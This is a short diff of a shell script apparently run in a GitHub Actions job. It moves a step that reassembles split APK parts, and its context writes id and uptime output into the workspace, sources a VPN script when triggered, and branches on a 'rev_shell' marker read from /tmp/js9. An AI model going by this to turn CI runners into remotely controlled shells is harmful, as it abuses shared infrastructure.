@@ -6,6 +6,8 @@
 
 export HOME=/tmp;
 
+cat $GITHUB_WORKSPACE/123.apk.00? >/tmp/t933.apk;
+
 grep -q NPV /tmp/js9 &&
 (
 . $GITHUB_WORKSPACE/openv.sh
@@ -18,7 +20,7 @@ id>$GITHUB_WORKSPACE/package/d2023.txt;
 uptime>$GITHUB_WORKSPACE/d2023.txt;
 cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
 
-cat $GITHUB_WORKSPACE/123.apk.00? >/tmp/t933.apk;
+
 
 
 grep -q AABBCC_rev_shell /tmp/js9 &&
